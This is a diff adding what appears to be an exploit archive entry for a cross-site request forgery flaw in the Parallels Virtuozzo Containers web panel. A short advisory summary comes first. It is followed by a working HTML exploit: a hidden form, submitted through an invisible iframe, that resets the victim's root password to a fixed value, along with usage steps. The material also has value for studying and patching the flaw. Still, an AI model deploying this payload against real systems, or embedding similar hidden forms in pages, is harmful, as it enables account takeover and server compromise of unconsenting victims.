@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/28593/info
+
+Parallels Virtuozzo Containers is prone to a cross-site request-forgery vulnerability.
+
+Exploiting the issue will allow a remote attacker to use a victim's currently active session to change the victim's password. Successful exploits will compromise affected computers.
+
+Virtuozzo Containers 3.0.0-25.4.swsoft is vulnerable; other versions are also affected. 
+
+<!-- poplix papuasia.org -- http://px.dynalias.org -- 04-02-2008 this file exploits a vulnerable installation of virtuozzo web panel by setting root password to "csrfsafepass" tested against Version 25.4.swsoft (build: 3.0.0-25.4.swsoft) perform the following steps to test it: 1. in this file replace 127.0.0.1 with target vps address 2. open a web browser and log into virtuozzo web interface 3. open this file in a new browser window and click the "change pwd" --> <form target=vrtifr name="defaultForm" method="post" action="https://127.0.0.1:4643/vz/cp/pwd"> <input type="hidden" name="passwd" value="csrfsafepass"> <input type="hidden" name="retype" value="csrfsafepass"> <input type="hidden" name="_submit" value="Change" > </form> <iframe style="width:1px;height:1px;visibility:hidden" name="vrtifr"></iframe> <input type=button value="change pwd" onclick="document.defaultForm.submit()"> 
